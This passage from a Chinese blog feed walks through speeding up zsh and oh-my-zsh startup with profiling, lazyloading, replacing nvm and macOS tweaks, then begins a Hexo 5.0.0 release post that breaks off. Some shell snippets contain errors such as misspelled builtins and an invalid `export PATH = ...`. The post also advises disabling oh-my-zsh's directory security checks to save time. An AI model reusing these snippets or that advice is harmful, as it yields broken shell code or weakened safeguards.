nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 